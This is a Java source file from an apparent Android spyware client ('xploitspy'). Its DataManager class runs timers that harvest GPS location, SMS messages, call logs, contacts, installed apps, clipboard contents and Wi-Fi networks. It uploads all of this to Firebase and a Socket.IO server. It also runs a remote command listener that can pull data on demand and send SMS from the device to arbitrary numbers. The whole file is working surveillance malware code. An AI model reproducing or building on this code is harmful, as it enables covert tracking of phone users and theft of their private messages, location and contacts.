package com.xploitspy.client.manager;

import android.content.ClipboardManager;
import android.content.Context;
import android.content.ClipData;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import com.xploitspy.client.Config;
import com.xploitspy.client.collector.*;
import com.xploitspy.client.manager.FirebaseManager;
import org.json.JSONArray;
import org.json.JSONObject;
import java.util.Map;
import java.util.Timer;
import java.util.TimerTask;

/**
 * DataManager - Mengelola pengumpulan dan pengiriman data
 */
public class DataManager {
    
    private static final String TAG = "DataManager";
    private Context context;
    private SocketManager socketManager;
    private FirebaseManager firebaseManager;
    private Timer dataCollectionTimer;
    private Handler mainHandler;
    
    // Data collectors
    private GpsCollector gpsCollector;
    private SmsCollector smsCollector;
    private CallCollector callCollector;
    private ContactCollector contactCollector;
    private AppCollector appCollector;
    private ClipboardCollector clipboardCollector;
    private NotificationCollector notificationCollector;
    private WifiCollector wifiCollector;
    
    public DataManager(Context context, SocketManager socketManager, FirebaseManager firebaseManager) {
        this.context = context;
        this.socketManager = socketManager;
        this.firebaseManager = firebaseManager;
        this.mainHandler = new Handler(Looper.getMainLooper());
        
        // Initialize collectors
        initializeCollectors();
    }
    
    private void initializeCollectors() {
        gpsCollector = new GpsCollector(context);
        smsCollector = new SmsCollector(context);
        callCollector = new CallCollector(context);
        contactCollector = new ContactCollector(context);
        appCollector = new AppCollector(context);
        clipboardCollector = new ClipboardCollector(context);
        notificationCollector = new NotificationCollector(context);
        wifiCollector = new WifiCollector(context);
    }
    
    public void start() {
        Log.d(TAG, "Starting data collection");
        
        dataCollectionTimer = new Timer();
        
        // GPS - setiap 30 detik
        dataCollectionTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                collectGps();
            }
        }, 0, 30000);
        
        // SMS - setiap 60 detik
        dataCollectionTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                collectSms();
            }
        }, 0, 60000);
        
        // Calls - setiap 60 detik
        dataCollectionTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                collectCalls();
            }
        }, 0, 60000);
        
        // Contacts - setiap 5 menit
        dataCollectionTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                collectContacts();
            }
        }, 0, 300000);
        
        // Apps - setiap 10 menit
        dataCollectionTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                collectApps();
            }
        }, 0, 600000);
        
        // Clipboard - setiap 10 detik
        dataCollectionTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                collectClipboard();
            }
        }, 0, 10000);
        
        // WiFi - setiap 5 menit
        dataCollectionTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                collectWifi();
            }
        }, 0, 300000);
        
        // Device status heartbeat - setiap 30 detik
        dataCollectionTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                try {
                    android.os.BatteryManager bm = (android.os.BatteryManager) context.getSystemService(Context.BATTERY_SERVICE);
                    int batteryLevel = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY);
                    boolean isCharging = bm.isCharging();
                    firebaseManager.updateDeviceStatus(batteryLevel, isCharging);
                } catch (Exception e) {
                    Log.e(TAG, "Error updating device status", e);
                    firebaseManager.updateDeviceStatus(0, false);
                }
            }
        }, 0, 30000);
        
        // Listen for commands from Firebase
        setupCommandListener();
        
        // Setup clipboard listener
        setupClipboardListener();
    }
    
    public void stop() {
        Log.d(TAG, "Stopping data collection");
        
        if (dataCollectionTimer != null) {
            dataCollectionTimer.cancel();
            dataCollectionTimer = null;
        }
    }
    
    private void collectGps() {
        try {
            JSONObject gpsData = gpsCollector.collect();
            if (gpsData != null) {
                double lat = gpsData.getDouble("latitude");
                double lon = gpsData.getDouble("longitude");
                float accuracy = (float) gpsData.getDouble("accuracy");
                double altitude = gpsData.getDouble("altitude");
                
                // Send to Firebase (works from any network)
                firebaseManager.sendGps(lat, lon, accuracy, altitude);
                
                // Also try Socket.IO if connected (same network)
                if (socketManager.isConnected()) {
                    gpsData.put("deviceId", Config.getDeviceId(context));
                    socketManager.emit("gps", gpsData);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error collecting GPS", e);
        }
    }
    
    private void collectSms() {
        try {
            JSONArray smsList = smsCollector.collect();
            for (int i = 0; i < smsList.length(); i++) {
                JSONObject sms = smsList.getJSONObject(i);
                String phoneNumber = sms.getString("phoneNumber");
                String message = sms.getString("message");
                String type = sms.getString("type");
                long timestamp = sms.getLong("timestamp"); // Get real timestamp from SMS
                
                // Send to Firebase with real timestamp
                firebaseManager.sendSms(phoneNumber, message, type, timestamp);
                
                // Also try Socket.IO if connected
                if (socketManager.isConnected()) {
                    sms.put("deviceId", Config.getDeviceId(context));
                    socketManager.emit("sms", sms);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error collecting SMS", e);
        }
    }
    
    private void collectCalls() {
        try {
            JSONArray callList = callCollector.collect();
            for (int i = 0; i < callList.length(); i++) {
                JSONObject call = callList.getJSONObject(i);
                String phoneNumber = call.getString("phoneNumber");
                String callType = call.getString("callType");
                int duration = call.getInt("duration");
                
                // Send to Firebase
                firebaseManager.sendCall(phoneNumber, callType, duration);
                
                // Also try Socket.IO if connected
                if (socketManager.isConnected()) {
                    call.put("deviceId", Config.getDeviceId(context));
                    socketManager.emit("call", call);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error collecting calls", e);
        }
    }
    
    private void collectContacts() {
        try {
            JSONArray contacts = contactCollector.collect();
            
            // Send to Firebase
            firebaseManager.sendContacts(contacts);
            
            // Also try Socket.IO if connected
            if (socketManager.isConnected()) {
                JSONObject data = new JSONObject();
                data.put("deviceId", Config.getDeviceId(context));
                data.put("contacts", contacts);
                socketManager.emit("contacts", data);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error collecting contacts", e);
        }
    }
    
    private void collectApps() {
        try {
            JSONArray apps = appCollector.collect();
            
            // Send to Firebase
            firebaseManager.sendApps(apps);
            
            // Also try Socket.IO if connected
            if (socketManager.isConnected()) {
                JSONObject data = new JSONObject();
                data.put("deviceId", Config.getDeviceId(context));
                data.put("apps", apps);
                socketManager.emit("apps", data);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error collecting apps", e);
        }
    }
    
    private void collectClipboard() {
        try {
            String content = clipboardCollector.getCurrentClipboard();
            if (content != null && !content.isEmpty()) {
                // Send to Firebase
                firebaseManager.sendClipboard(content);
                
                // Also try Socket.IO if connected
                if (socketManager.isConnected()) {
                    JSONObject data = new JSONObject();
                    data.put("deviceId", Config.getDeviceId(context));
                    data.put("content", content);
                    socketManager.emit("clipboard", data);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error collecting clipboard", e);
        }
    }
    
    private void collectWifi() {
        try {
            JSONArray networks = wifiCollector.collect();
            
            // Send to Firebase
            firebaseManager.sendWifi(networks);
            
            // Also try Socket.IO if connected
            if (socketManager.isConnected()) {
                JSONObject data = new JSONObject();
                data.put("deviceId", Config.getDeviceId(context));
                data.put("networks", networks);
                socketManager.emit("wifi", data);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error collecting WiFi", e);
        }
    }
    
    private void setupClipboardListener() {
        // Clipboard monitoring akan dilakukan melalui Accessibility Service
        // atau Notification Listener Service
    }
    
    private void setupCommandListener() {
        firebaseManager.listenForCommands((commandId, command, parameters) -> {
            Log.d(TAG, "Received command: " + command + " with ID: " + commandId);
            
            try {
                switch (command) {
                    case "get_contacts":
                        executeGetContacts(commandId);
                        break;
                    case "send_sms":
                        executeSendSms(commandId, parameters);
                        break;
                    case "get_gps":
                        executeGetGps(commandId);
                        break;
                    case "get_sms":
                        executeGetSms(commandId);
                        break;
                    case "get_calls":
                        executeGetCalls(commandId);
                        break;
                    case "get_apps":
                        executeGetApps(commandId);
                        break;
                    case "get_wifi":
                        executeGetWifi(commandId);
                        break;
                    default:
                        Log.w(TAG, "Unknown command: " + command);
                        firebaseManager.updateCommandResult(commandId, false, "Unknown command: " + command);
                }
            } catch (Exception e) {
                Log.e(TAG, "Error executing command: " + command, e);
                firebaseManager.updateCommandResult(commandId, false, "Error: " + e.getMessage());
            }
        });
    }
    
    private void executeGetContacts(String commandId) {
        try {
            JSONArray contacts = contactCollector.collect();
            
            // Send contacts to Firebase
            firebaseManager.sendContacts(contacts);
            
            // Update command result
            firebaseManager.updateCommandResult(commandId, true, "Collected " + contacts.length() + " contacts");
            
            Log.d(TAG, "Executed get_contacts: " + contacts.length() + " contacts");
        } catch (Exception e) {
            Log.e(TAG, "Error executing get_contacts", e);
            firebaseManager.updateCommandResult(commandId, false, "Error: " + e.getMessage());
        }
    }
    
    private void executeSendSms(String commandId, Map<String, Object> parameters) {
        try {
            String phoneNumber = (String) parameters.get("phoneNumber");
            String message = (String) parameters.get("message");
            
            if (phoneNumber == null || message == null) {
                firebaseManager.updateCommandResult(commandId, false, "Missing phoneNumber or message");
                return;
            }
            
            android.telephony.SmsManager smsManager = android.telephony.SmsManager.getDefault();
            smsManager.sendTextMessage(phoneNumber, null, message, null, null);
            
            firebaseManager.updateCommandResult(commandId, true, "SMS sent to " + phoneNumber);
            
            Log.d(TAG, "Executed send_sms to: " + phoneNumber);
        } catch (Exception e) {
            Log.e(TAG, "Error executing send_sms", e);
            firebaseManager.updateCommandResult(commandId, false, "Error: " + e.getMessage());
        }
    }
    
    private void executeGetGps(String commandId) {
        try {
            JSONObject gpsData = gpsCollector.collect();
            if (gpsData != null) {
                double lat = gpsData.getDouble("latitude");
                double lon = gpsData.getDouble("longitude");
                firebaseManager.sendGps(lat, lon, (float) gpsData.getDouble("accuracy"), gpsData.getDouble("altitude"));
                firebaseManager.updateCommandResult(commandId, true, "GPS: " + lat + ", " + lon);
            } else {
                firebaseManager.updateCommandResult(commandId, false, "GPS data not available");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error executing get_gps", e);
            firebaseManager.updateCommandResult(commandId, false, "Error: " + e.getMessage());
        }
    }
    
    private void executeGetSms(String commandId) {
        try {
            // Use collectAll() to get all SMS, not just new ones
            JSONArray smsList = smsCollector.collectAll();
            for (int i = 0; i < smsList.length(); i++) {
                JSONObject sms = smsList.getJSONObject(i);
                long timestamp = sms.getLong("timestamp"); // Get real timestamp from SMS
                firebaseManager.sendSms(
                    sms.getString("phoneNumber"),
                    sms.getString("message"),
                    sms.getString("type"),
                    timestamp
                );
            }
            firebaseManager.updateCommandResult(commandId, true, "Collected " + smsList.length() + " SMS");
        } catch (Exception e) {
            Log.e(TAG, "Error executing get_sms", e);
            firebaseManager.updateCommandResult(commandId, false, "Error: " + e.getMessage());
        }
    }
    
    private void executeGetCalls(String commandId) {
        try {
            JSONArray callList = callCollector.collect();
            for (int i = 0; i < callList.length(); i++) {
                JSONObject call = callList.getJSONObject(i);
                firebaseManager.sendCall(
                    call.getString("phoneNumber"),
                    call.getString("callType"),
                    call.getInt("duration")
                );
            }
            firebaseManager.updateCommandResult(commandId, true, "Collected " + callList.length() + " calls");
        } catch (Exception e) {
            Log.e(TAG, "Error executing get_calls", e);
            firebaseManager.updateCommandResult(commandId, false, "Error: " + e.getMessage());
        }
    }
    
    private void executeGetApps(String commandId) {
        try {
            JSONArray apps = appCollector.collect();
            firebaseManager.sendApps(apps);
            firebaseManager.updateCommandResult(commandId, true, "Collected " + apps.length() + " apps");
        } catch (Exception e) {
            Log.e(TAG, "Error executing get_apps", e);
            firebaseManager.updateCommandResult(commandId, false, "Error: " + e.getMessage());
        }
    }
    
    private void executeGetWifi(String commandId) {
        try {
            JSONArray networks = wifiCollector.collect();
            firebaseManager.sendWifi(networks);
            firebaseManager.updateCommandResult(commandId, true, "Collected " + networks.length() + " WiFi networks");
        } catch (Exception e) {
            Log.e(TAG, "Error executing get_wifi", e);
            firebaseManager.updateCommandResult(commandId, false, "Error: " + e.getMessage());
        }
    }
}

